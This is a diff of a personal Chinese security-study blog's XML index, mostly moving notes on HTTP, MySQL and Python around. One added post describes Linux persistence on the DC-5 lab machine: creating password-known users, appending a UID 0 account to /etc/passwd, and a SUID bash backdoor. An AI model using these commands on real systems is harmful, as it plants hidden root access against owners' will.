+<p>由于HTTP是一种无状态的协议，服务器单从网络连接上无从知道客户身份。怎么办呢？就给客户端们颁发一个通行证吧，每人一个，无论谁访问都必须携带自己通行证。这样服务器就能从通行证上确认客户身份了。这就是Cookie的工作原理。（如果盗取了别人的cookie，就可以用别人的身份登陆一些网站，当然，有些网站还会有别的认证方式，但这种安全隐患还是值得注意）</p>
+<p> </p>
+<p>（图片来源：乾颐堂）</p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>iwebsec学习笔记</title>
     <url>/2021/01/17/iwebsec%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13435718.html">源地址：https://www.cnblogs.com/This-is-Y/p/13435718.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -2754,134 +3118,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>htttp协议部分笔记</title>
-    <url>/2020/02/05/htttp%E5%8D%8F%E8%AE%AE%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12256079.html">源地址：https://www.cnblogs.com/This-is-Y/p/12256079.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>**报文：　**　</p>
-<p><strong>http请求报文：</strong></p>
-<p>基本格式</p>
-<p>　　<img src="1503868-20200205111708601-107755887.png" alt width="651" height="271"></p>
-<p> 请求行：这里那有道翻译的网页用一下（应该没啥关系吧）</p>
-<p>　　<img src="1503868-20200205155437106-1447717939.png" alt></p>
-<p> 　　请求行由3部分组成，请求方法，请求URL，HTTP协议版本。</p>
-<p>　　　　<strong>方法</strong>：最常见的有GET，POST，请求方法一定是要大写　　　　　　</p>
-<p>HTTP/1.0和HTTP/1.1支持的方法：</p>
-<img src="1503868-20200203143502218-550940739.png" alt width="598" height="308">
-
-<p> 但因为安全隐患等原因，用的最多的还是POST和GET，关于POST和GET：<a class="link" href="https://www.cnblogs.com/This-is-Y/p/12244175.html">https://www.cnblogs.com/This-is-Y/p/12244175.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>　　　　　　 <strong>URL</strong>：URI（Uniform Resource Identifier）：统一资源标识符</p>
-<p>URL（Uniform Resource Locator）：统一资源定位符</p>
-<p>URL是URI的子集，URL是一种具体的URI。</p>
-<p>较为经典的URI</p>
-<img src="1503868-20200203134002377-1332556046.png" alt width="559" height="114">
-
-<p>协议有http，https，ftp 等</p>
-<p>登陆认证信息一般出现得较少</p>
-<p>　　　　　　<strong>协议版本：</strong>最初的版本HTTP/0.9，然后是HTTP/1.0，再之后是将持久连接改为默认的HTTP/1.1，这是最主流的HTTP协议版本。再到现在的的HTTP/2.0，这个用的不多。</p>
-<p> </p>
-<p><strong>http响应报文：</strong></p>
-<p>基本格式</p>
-<img src="1503868-20200203135421531-427205203.png" alt width="577" height="369">
-
-<p><strong>响应码：</strong> 有2xx，3xx，4xx，5xx这几大类，其中1xx表示信息性状态码，接受的请求正在处理。2xx表示成功，请求正常处理完毕。3xx多表示重定向，需要进行附加操作完成请求。4xx多表示失败（客户端），服务器无法处理请求。5xx同样表示失败（服务端），服务器处理请求出错。</p>
-<p>1xx：有100  Continue，表示继续。101  Switching Protocol，切换协议。1xx响应码很少见，</p>
-<p>2xx：最常见的是200  OK，表示请求正常处理。  204  No Content 没有内容，一般在需要客户端发送信息而服务端不需要返回<strong>新</strong>信息内容时出现（一般在一个网页按F5刷新，看似什么都没有发生，实际上浏览器发送了请求，而此时响应码就是204）。  206 Partial Content 请求并发送部分内容，一般出现在发送内容过大时，在首部字段中使用range头对文件进行分块发送（当浏览一些较大的图片，PDF时会出现）</p>
-<p>3xx：301 Moved Permanently 永久移动，即重定向，当前全球的资源分配了新的URI（可以在首部字段中找到Location字段找到新的URI）。302 Found 临时移动 ，在防火墙认证时经常用到。与302一起出现的还有  303 See Other 查看其他位置 ，在302跳转认证成功了，就会出现303 see other，这个表示由于请求对应的资源存在另一个URI，应使用GET方法定向获取请求的资源（303状态码明确表示用户应该使用GET方法获取资源。）304 Not Modified 未修改，告诉客户端,所请求的内容距离上次访问并没有变化. 客户端可以直接从浏览器缓存里获取该资源（304是3xx里面和重定向没关系的一个）。307  Temporary Redirect  临时重定向 ，和302类似，但307更为严谨，不会从POST变成GET，302尽管禁止POST变换成GET，但是大多数人并不遵守。关于重定向，还有一个META Redirect，只需要在html的head里写上&lt;meta http-equiv=”refresh” content=”5;URL=新的URL”&gt;  content里面的5代表延迟时间5s，这样操作返回的响应码是200 OK<br>4xx：400 Bad Request 错误请求，发送的URL有错误，比如无法正确转码什么的。401 Unauthorized 未认证，在打开一个网页时弹出窗口需要你认证身份。403 Forbidden 禁止访问  ,权限不足，无法访问请求的文件。404 Not Found 喜闻乐见的一个状态码，这个不需要多说了，访问文件不存在。<br>5xx：500 Internal Server Error  内部服务器错误，一般是阿帕奇服务器出现问题。503 Service Unavailable 服务不可用，服务器出现超负载或者正在停机维护。</p>
-<p>　　这里我只说一小部分响应码，响应码总结大全：<a class="link" href="https://www.cnblogs.com/isykw/p/6115469.html">https://www.cnblogs.com/isykw/p/6115469.html<i class="fas fa-external-link-alt"></i></a> 。</p>
-<p> </p>
-<p>首部字段细分：<br>　　 通用首部字段：在请求报文和响应报文中都可能出现</p>
-<p>请求首部字段：只在请求报文中出现</p>
-<p>响应首部字段：只在响应报文中出现</p>
-<p>实体首部字段：和实际传输数据相关的参数。</p>
-<p>其他</p>
-<p> </p>
-<p><strong>通用首部字段：</strong></p>
-<img src="1503868-20200205130853547-1458158193.png" alt width="658" height="411">
-
-<p>　　Cache-Control：缓存控制，是否使用缓存</p>
-<p>　　Connection：持久连接，后文有详细提到，有Keep-Alive ，close等值</p>
-<p>　　Keep-Alive：控制连接断开条件，timeout（超时时间），max请求次数极大值</p>
-<p>　　Date：HTTP报文产生日期</p>
-<p>　　Transfer-Encoding：传输报文主体采用的编码方式，chunked（分段式编码）</p>
-<p>　　Upgrade：检测协议或是否可以使用更高版本协议进行通信（不太懂）</p>
-<p>　　Warning：警告。[警告码][警告主机：端口号][警告内容]（[警告时间]（可省略））</p>
-<p><strong>请求首部字段：</strong></p>
-<p>　　　　<img src="1503868-20200205135524987-1420334523.png" alt></p>
-<p> </p>
-<p> </p>
-<p>　　　　Accept：告知服务器用户代理能够处理的媒体类型及媒体类型的相对优先级 ，如text/plain;q=0.3,text/htm;q=0.4,  不同的文件类型用 ‘ , ‘  分隔，q的值未权重，0~1，可精确到小数点后3位，默认值位1.0。服务器提供多种内容时，优先返回权重值高的媒体类型。</p>
-<p>　　　　　　　　文本文件：text/html，text/plain，text/css……</p>
-<p>　　　　　　　　　　　　　application/xml，application/xhtml+xml……</p>
-<p>　　　　　　　　图片文件：image/jpeg，image/gif，image/png……</p>
-<p>　　　　　　　　视频文件：video/mpeg，video/quicktime……</p>
-<p>　　　　　　　　应用程序使用的二进制文件：application/octet-stream，application/zip……</p>
-<p>   　　　Accept-Charset：可接受的字符集，像utf-8等。同样有优先级</p>
-<p>　　　　Accept-Encoding：告知服务器用户代理支持的内容编码以及内容编码的优先级，gzip，deflate等</p>
-<p>　　　　　　　　gzip：由文件压缩程序gzip（GNU zip）生成的编码格式（RFC1952）</p>
-<p>　　　　　　　　compress：由UNIX压缩程序compress生成的编码格式</p>
-<p>　　　　　　　　deflate：组合使用zlib格式（RFC1950）及由deflate压缩算法（RFC951）生成的编码格式</p>
-<p>　　　　　　　　identity：不执行亚索或不会变化的默认编码格式</p>
-<p>　　　　Accept-Language：告知服务器用户代理能够处理的自然语言集（指中文或英文等），如zh/cn,zh;q=0.9,en-us;q=0.6，同样有优先级</p>
-<p>　　　　Authorization：告知服务器用户的认证信息（证书值），出现401响应码时会出现这个字段</p>
-<p>　　　　Host：告知服务器请求的资源所处的互联网主机名和端口号，Host是HTTP/1.1规范内唯一一个必须被包含在请求内的首部字段。Host和以单台服务器分配多个域名的虚拟主机的工作机制有密切的关系</p>
-<p>　　　　Referer：告知服务器请求的原始资源的URI。相当于告诉服务器我是从哪里过来的，可用于防止盗链，同时有一定安全隐患。Referer的中文意思是推荐人。</p>
-<p>　　　　User-Agent：发送创建请求的浏览器，系统，IP和用户代理名称等信息给服务器，检查User-Agent是一种最简单的反爬手段，与之对应的可以通过fake-useragent库来反反爬。同时也可以使用burpsuite来修改User-Agent。</p>
-<p>　　　<strong>响应首部字段：</strong></p>
-<p>**　　　　<img src="1503868-20200205154342421-1762077444.png" alt width="611" height="380">**</p>
-<p>　　　　Location：出现重定向时，告知客户端新的URL　</p>
-<p> </p>
-<p> 　　　   Server：告知客户端当前服务器上安装的HTTP服务器应用程序的信息，有安全隐患，会暴露apache服务器，openssl，PHP的版本和操作系统等信息。可通过以下方法解决</p>
-<p>　　　　　<img src="1503868-20200205155053585-767915234.png" alt width="510" height="84"></p>
-<p> </p>
-<p> </p>
-<p> 　　　　WWW-Authorizate：和401有关，告知客户端需要做认证</p>
-<p>　　　<strong>实体首部字段：</strong></p>
-<p>**　　　　<img src="1503868-20200205160107818-1373089464.png" alt width="527" height="369">**</p>
-<p> </p>
-<p> </p>
-<p> 　　　　Content-Length：实体主体部分的大小（以字节为单位）</p>
-<p>　　　　 Content-Type：表示报文主体对象类型，常见的是text/html </p>
-<p>　　　　 Allow：用于通知客户端获取指定资源可使用的所有HTTP方法，当接收到不支持的方法时，会返回405 Method Not Allowed。同时，还会把所有能支持的HTTP方法写入Allow字段后返回　</p>
-<p>　　　　 Content-Encoding：告知客户端服务器对实体的主体部分的编码方式（如gzip等）</p>
-<p>　　　　 Content-Language：告知客户端服务器发送的实体主体使用的自然语言</p>
-<p>　　　　 Content-Location：表示报文主题返回资源对应的URI。比如访问一个英文页面，但是请求Accept-Language要求的是中文，就返回一个中文页面给客户端，返回的这个中文页面的URL，就在Content-Location字段里（暂时没找到合适的例子，找到了，我记得的话就补充一下）</p>
-<p>　　　　 Content-Type：说明了实体主体内对象的媒体类型，和Accept一样，用type/subtype的形式赋值。防火墙限制下载部分类型文件，就是从这里找数据</p>
-<p>　　　　 Expires：缓存的存活时间</p>
-<p><strong>其他：</strong></p>
-<p>**　　**为cookie服务的字段：</p>
-<p>　　　　set-cookie：参数（值，存活时间（expires），路径（path），域名（domain），（secure），（HttpOnly））</p>
-<p>　　　　　　值：就是cookie的值。</p>
-<p>　　　　　　expires：cookis可以使用多长时间</p>
-<p>　　　　　　domain：假如设置域名为  .thisisy.com 那么该cookie可以发给<a class="link" href="http://www.thisisy.com,也可以发给mail.thisisy.com等等,存在安全隐患,建议不要设置/">www.thisisy.com,也可以发给mail.thisisy.com等等，存在安全隐患，建议不要设置<i class="fas fa-external-link-alt"></i></a></p>
-<p>　　　　　　path：和域名原理一样，也是建议不要设置（关于path和domain的详解，看这里：<a class="link" href="https://www.jb51.net/article/44561.htm">https://www.jb51.net/article/44561.htm<i class="fas fa-external-link-alt"></i></a>）</p>
-<p>　　　　　　secure：设置该参数，则该cookie只能在建立HTTPS的安全连接下才可以发送cookie</p>
-<p>　　　　　　HttpOnly：使js脚本无法获得cookie，主要用于防止xss攻击对cookie的窃取</p>
-<p> 同样，首部字段与主体之间要留有空行，主体就是网页html源码</p>
-<p> </p>
-<p>http是不保存状态的协议，即<strong>无状态协议</strong>，http协议不对请求和响应之间的通信状态做保存，也就是说，在http这个级别，协议对于已经发送过的请求或响应都不做持久化处理。只是为了<strong>更快的处理大量事物</strong>，确保协议的可伸缩性，而特意把http协议设计得如此简单。而有些时候需要对请求或响应做保存，这时候就出现了隐含参数和cookie</p>
-<p> </p>
-<p><strong>哑服务：</strong></p>
-<p>关于http协议的瞬时性，原始版本http都是建立建立，发送请求，接受响应，连接断开。这样一个过程。但是这个过程在大型网页中非常消耗资源（大量资源都用在了建立三次握手上）。</p>
-<img src="1503868-20200203144646291-544286251.png" alt>
-
-<p>后来提出了持久连接，只要任意一端没有提出断开连接，连接就会一直存在。在http/1.0中，默认关闭，需要在http头中加入”Connection:Keep-Alive”开启持久连接，在http/1.1中，持久连接变成默认开启，在http头中加入”Connection:close”才会关闭。于是整个过程就变成了建立连接，发送请求，接受响应，发送请求，接受响应…………直到断开连接，就像一个人坐一趟列车在两个地方来回走，必须到达A城才可以去B城，到了B城才能再回A城，</p>
-<img src="1503868-20200203144608207-1697778574.png" alt>
-
-<p>但是人们发现这样还不够快，于是出现了管道化，在前面持久连接的基础上，发送一次请求后，不等接受响应，直接发送第二个请求，就像两根管子，分别处理发送的请求与接受的响应</p>
-<img src="1503868-20200203144452571-280682539.png" alt>
-
-<p><strong>cookie：</strong></p>
-<p>**　　**Cookie是一段不超过4KB的小型文本数据，由一个名称（Name）、一个值（Value）和其它几个用于控制Cookie有效期、安全性、使用范围的可选属性组成。</p>
-<p> </p>
-<p>由于HTTP是一种无状态的协议，服务器单从网络连接上无从知道客户身份。怎么办呢？就给客户端们颁发一个通行证吧，每人一个，无论谁访问都必须携带自己通行证。这样服务器就能从通行证上确认客户身份了。这就是Cookie的工作原理。（如果盗取了别人的cookie，就可以用别人的身份登陆一些网站，当然，有些网站还会有别的认证方式，但这种安全隐患还是值得注意）</p>
-<p> </p>
-<p>（图片来源：乾颐堂）</p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>jsp与eclipse对接</title>
     <url>/2020/09/07/jsp%E4%B8%8Eeclipse%E5%AF%B9%E6%8E%A5/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13629909.html">源地址：https://www.cnblogs.com/This-is-Y/p/13629909.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -3145,6 +3381,26 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
+    <title>linux权限维持</title>
+    <url>/2021/06/08/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
+    <content><![CDATA[<p>以刚刚拿下的DC-5靶机为例，测试一下各种linux权限维持的方法</p>
+<p>方法都来自：<a class="link" href="https://phyb0x.github.io/2018/10/23/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/">https://phyb0x.github.io/2018/10/23/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/<i class="fas fa-external-link-alt"></i></a></p>
+<p>以此记录一下</p>
+<p><img src="mbGCWWC.png" alt="mbGCWWC"></p>
+<h2 id="添加超级用户："><a href="#添加超级用户：" class="headerlink" title="添加超级用户："></a>添加超级用户：</h2><p>添加</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line">useradd -p `openssl passwd 123456` guest</span><br><span class="line">useradd -p &quot;$(openssl passwd 123456)&quot; guest</span><br><span class="line">useradd newuwer;echo -e &quot;123456n123456n&quot; |passwd newuser</span><br></pre></td></tr></table></figure>
+<p>设置root权限</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;guest:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd</span><br><span class="line">echo &#x27;guest:123456&#x27;|chpasswd</span><br></pre></td></tr></table></figure>
+<p>实际测试中发现添加用户后，passwd文件中就存在那一条数据了，再写的话，修改不了权限，所以我这里先添加数据到passwd中，再添加用户（或者修改密码）</p>
+<p><img src="image-20210608171347277.png" alt="image-20210608171347277"></p>
+<p>除此之外，还有一个方式添加新用户，<br>先对密码就行加密<br>openssl passwd -1 -salt admin admin<br>-1 的意思是使用md5加密算法<br>-salt 自动插入一个随机数作为文件内容加密，默认选项 加点盐：<br>得到密文后，拼接为一条消息，写入到passwd文件中，这样子就不需要chpasswd了<br>    admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0::/root:/bin/bash<br>    echo ‘admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0::/root:/bin/bash’ &gt; /etc/passwd</p>
+<p>有些时候添加不成功是因为用户策略可以适当加强密码强度<br>有些也会限制root权限用户远程登录</p>
+<h2 id="SUID-shell"><a href="#SUID-shell" class="headerlink" title="SUID shell"></a>SUID shell</h2><p>提权后，cp /bin/bash /.test<br>chmod 4755 /.test<br>之后以普通用户运行<br>/.test -p</p>
+<p><img src="image-20210608172859611.png" alt="image-20210608172859611"><br>euid:effective user ID:有效用户ID,指进程执行时对文件的访问权限</p>
+<p>后面的由于环境不合适，就没测了。</p>
+]]></content>
+  </entry>
+  <entry>
     <title>msf启动显示 Nodatabase support：could not connect  to server connection refused</title>
     <url>/2020/02/19/msf%E5%90%AF%E5%8A%A8%E6%98%BE%E7%A4%BA%20Nodatabase%20support%EF%BC%9Acould%20not%20connect%20%20to%20server%20connection%20refused/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12331180.html">源地址：https://www.cnblogs.com/This-is-Y/p/12331180.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -3322,6 +3578,54 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
+    <title>mysql中的concat().concat_ws(),group_concat()</title>
+    <url>/2020/08/12/mysql%E4%B8%AD%E7%9A%84concat().concat_ws(),group_concat()/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13491416.html">源地址：https://www.cnblogs.com/This-is-Y/p/13491416.html<i class="fas fa-external-link-alt"></i></a></p>
+<p> 简单建立一个表</p>
+<img src="1503868-20200812161041473-1504706485.png" alt loading="lazy">
+
+<p> </p>
+<p> <strong>concat()</strong></p>
+<p>用于连接字符串，举个例子</p>
+<p> select concat(id,’-‘,name,’-‘,sex,’-‘) from null_test;</p>
+<img src="1503868-20200812161031226-883321634.png" alt loading="lazy">
+
+<p> </p>
+<p> 值得注意的是，空字符也算字符（第五条数据），但是如果参数中有null，则整个输出变成null（第三第四条数据）；</p>
+<p> </p>
+<p><strong>concat_ws()</strong></p>
+<p>在数据较少时，用concat()可能不会出现什么问题，但是如果数据量过大，一个一个为其配置分隔符就显得累赘，于是就有了concat_ws(),  CONCAT_WS() 代表 CONCAT With Separator</p>
+<p>第一个参数为separator，即分隔符</p>
+<p>如果分隔符为NULL，则所有输出都为NULL；</p>
+<p>select concat_ws(<strong>NULL</strong>,id,name,sex) from null_test;</p>
+<img src="1503868-20200812160011781-86849650.png" alt loading="lazy">
+
+<p> </p>
+<p>如果参数中有null，直接跳过后，正常输出 </p>
+<p>select concat_ws(‘==’,id,name,sex) from null_test;</p>
+<img src="1503868-20200812160114370-1393843926.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p><strong>group_concat()</strong></p>
+<p>group_concat()像是concat()的加强版，concat()把字符串组合起来，group_concat()把组合后的字符串再组合起来，</p>
+<p>select group_concat(id,’-‘,name,’-‘,sex) from null_test;</p>
+<img src="1503868-20200812161304728-239534354.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p>这三个都可以用as 来修改列名</p>
+<p>举个例子</p>
+<p>select concat(id,’==’,name) as id_name,concat(name,’==’,’sex’) as name_sex from null_test;</p>
+<img src="1503868-20200812163708930-428683991.png" alt loading="lazy">
+
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>mysql只能显示部分中文问题 解决</title>
     <url>/2020/09/27/mysql%E5%8F%AA%E8%83%BD%E6%98%BE%E7%A4%BA%E9%83%A8%E5%88%86%E4%B8%AD%E6%96%87%E9%97%AE%E9%A2%98%20%E8%A7%A3%E5%86%B3/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13738043.html">源地址：https://www.cnblogs.com/This-is-Y/p/13738043.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -3373,48 +3677,14 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>mysql中的concat().concat_ws(),group_concat()</title>
-    <url>/2020/08/12/mysql%E4%B8%AD%E7%9A%84concat().concat_ws(),group_concat()/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13491416.html">源地址：https://www.cnblogs.com/This-is-Y/p/13491416.html<i class="fas fa-external-link-alt"></i></a></p>
-<p> 简单建立一个表</p>
-<img src="1503868-20200812161041473-1504706485.png" alt loading="lazy">
-
-<p> </p>
-<p> <strong>concat()</strong></p>
-<p>用于连接字符串，举个例子</p>
-<p> select concat(id,’-‘,name,’-‘,sex,’-‘) from null_test;</p>
-<img src="1503868-20200812161031226-883321634.png" alt loading="lazy">
-
-<p> </p>
-<p> 值得注意的是，空字符也算字符（第五条数据），但是如果参数中有null，则整个输出变成null（第三第四条数据）；</p>
-<p> </p>
-<p><strong>concat_ws()</strong></p>
-<p>在数据较少时，用concat()可能不会出现什么问题，但是如果数据量过大，一个一个为其配置分隔符就显得累赘，于是就有了concat_ws(),  CONCAT_WS() 代表 CONCAT With Separator</p>
-<p>第一个参数为separator，即分隔符</p>
-<p>如果分隔符为NULL，则所有输出都为NULL；</p>
-<p>select concat_ws(<strong>NULL</strong>,id,name,sex) from null_test;</p>
-<img src="1503868-20200812160011781-86849650.png" alt loading="lazy">
-
-<p> </p>
-<p>如果参数中有null，直接跳过后，正常输出 </p>
-<p>select concat_ws(‘==’,id,name,sex) from null_test;</p>
-<img src="1503868-20200812160114370-1393843926.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p><strong>group_concat()</strong></p>
-<p>group_concat()像是concat()的加强版，concat()把字符串组合起来，group_concat()把组合后的字符串再组合起来，</p>
-<p>select group_concat(id,’-‘,name,’-‘,sex) from null_test;</p>
-<img src="1503868-20200812161304728-239534354.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p>这三个都可以用as 来修改列名</p>
-<p>举个例子</p>
-<p>select concat(id,’==’,name) as id_name,concat(name,’==’,’sex’) as name_sex from null_test;</p>
-<img src="1503868-20200812163708930-428683991.png" alt loading="lazy">
-
-<p> </p>
+    <title>mysql登陆时出现ERROR 2013 (HY000) Lost connection to MySQL server at &#39;reading initial communication packet&#39;, system error 0</title>
+    <url>/2019/07/31/mysql%E7%99%BB%E9%99%86%E6%97%B6%E5%87%BA%E7%8E%B0ERROR%202013%20(HY000)%20Lost%20connection%20to%20MySQL%20server%20at%20&#39;reading%20initial%20communication%20packet&#39;,%20system%20error%200/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11279689.html">源地址：https://www.cnblogs.com/This-is-Y/p/11279689.html<i class="fas fa-external-link-alt"></i></a></p>
+<p> 有4到5天没开mysql，这天晚上打=打开phpstudy，想进去mysql练习练习，结果丢给我这个</p>
+<p>ERROR 2013 (HY000): Lost connection to MySQL server at ‘reading initial communication packet’, system error: 0</p>
+<p>错误2013 (HY000):读取初始通信包时MySQL服务器连接丢失，系统错误0</p>
+<p>windows进cmd命令行，输入server.msc，然后找到mysql的服务，重启一下就好了。</p>
+<p>（听说还有更复杂的情况，我又没碰到，关我什么事，碰到了再补上）</p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -3496,20 +3766,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>mysql登陆时出现ERROR 2013 (HY000) Lost connection to MySQL server at &#39;reading initial communication packet&#39;, system error 0</title>
-    <url>/2019/07/31/mysql%E7%99%BB%E9%99%86%E6%97%B6%E5%87%BA%E7%8E%B0ERROR%202013%20(HY000)%20Lost%20connection%20to%20MySQL%20server%20at%20&#39;reading%20initial%20communication%20packet&#39;,%20system%20error%200/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11279689.html">源地址：https://www.cnblogs.com/This-is-Y/p/11279689.html<i class="fas fa-external-link-alt"></i></a></p>
-<p> 有4到5天没开mysql，这天晚上打=打开phpstudy，想进去mysql练习练习，结果丢给我这个</p>
-<p>ERROR 2013 (HY000): Lost connection to MySQL server at ‘reading initial communication packet’, system error: 0</p>
-<p>错误2013 (HY000):读取初始通信包时MySQL服务器连接丢失，系统错误0</p>
-<p>windows进cmd命令行，输入server.msc，然后找到mysql的服务，重启一下就好了。</p>
-<p>（听说还有更复杂的情况，我又没碰到，关我什么事，碰到了再补上）</p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>powershell 免杀 invoke-obfuscation</title>
     <url>/2020/10/04/powershell%20%E5%85%8D%E6%9D%80%20invoke-obfuscation/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13767546.html">源地址：https://www.cnblogs.com/This-is-Y/p/13767546.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -3563,6 +3819,33 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
+    <title>python format() 格式化输出</title>
+    <url>/2020/10/18/python%20format()%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13806255.html">源地址：https://www.cnblogs.com/This-is-Y/p/13806255.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>进制转换问题</strong></p>
+<p>二进制-Binary-b</p>
+<p>八进制-Octal-o</p>
+<p>十进制-Decimal-d</p>
+<p>十六进制-Hexadecimal-x</p>
+<p>效果如图</p>
+<img src="1503868-20201018092410558-702270383.png" alt>
+
+<p> </p>
+<p>代码👇</p>
+<p> </p>
+<p>位置匹配</p>
+<p>效果</p>
+<img src="1503868-20201018093842583-71552239.png" alt loading="lazy">
+
+<p> </p>
+<p>代码👇</p>
+<p> 参考：<a class="link" href="https://www.cnblogs.com/fat39/p/7159881.html">https://www.cnblogs.com/fat39/p/7159881.html<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>python UDP多线程通信，以及自己加的花里胡哨、乱七八糟的东西</title>
     <url>/2021/03/12/python%20UDP%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1%EF%BC%8C%E4%BB%A5%E5%8F%8A%E8%87%AA%E5%B7%B1%E5%8A%A0%E7%9A%84%E8%8A%B1%E9%87%8C%E8%83%A1%E5%93%A8%E3%80%81%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E4%B8%9C%E8%A5%BF/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14526761.html">源地址：https://www.cnblogs.com/This-is-Y/p/14526761.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -3607,33 +3890,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <img src="1503868-20210312222219445-1902128098.png" width="1200" loading="lazy">
 
 <p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>python format() 格式化输出</title>
-    <url>/2020/10/18/python%20format()%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13806255.html">源地址：https://www.cnblogs.com/This-is-Y/p/13806255.html<i class="fas fa-external-link-alt"></i></a></p>
-<p><strong>进制转换问题</strong></p>
-<p>二进制-Binary-b</p>
-<p>八进制-Octal-o</p>
-<p>十进制-Decimal-d</p>
-<p>十六进制-Hexadecimal-x</p>
-<p>效果如图</p>
-<img src="1503868-20201018092410558-702270383.png" alt>
-
-<p> </p>
-<p>代码👇</p>
-<p> </p>
-<p>位置匹配</p>
-<p>效果</p>
-<img src="1503868-20201018093842583-71552239.png" alt loading="lazy">
-
-<p> </p>
-<p>代码👇</p>
-<p> 参考：<a class="link" href="https://www.cnblogs.com/fat39/p/7159881.html">https://www.cnblogs.com/fat39/p/7159881.html<i class="fas fa-external-link-alt"></i></a></p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -3782,31 +4038,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>uplay游戏玩15分钟就强制退出来的解决办法</title>
-    <url>/2020/02/07/uplay%E6%B8%B8%E6%88%8F%E7%8E%A915%E5%88%86%E9%92%9F%E5%B0%B1%E5%BC%BA%E5%88%B6%E9%80%80%E5%87%BA%E6%9D%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12272226.html">源地址：https://www.cnblogs.com/This-is-Y/p/12272226.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>按下win键，输入语言，打开语言设置。</p>
-<img src="1503868-20200207102923968-791006671.png" alt width="558" height="499">
-
-<p> </p>
-<p> 找到首选语言，点击添加首选语言，添加English（US）这个。</p>
-<img src="1503868-20200207103125879-643552617.png" alt width="561" height="291">
-
-<p>然后在启动uplay游戏前，按win+空格切换到英语，这样子就可以愉快的玩耍了，不会再15分钟掉出来了</p>
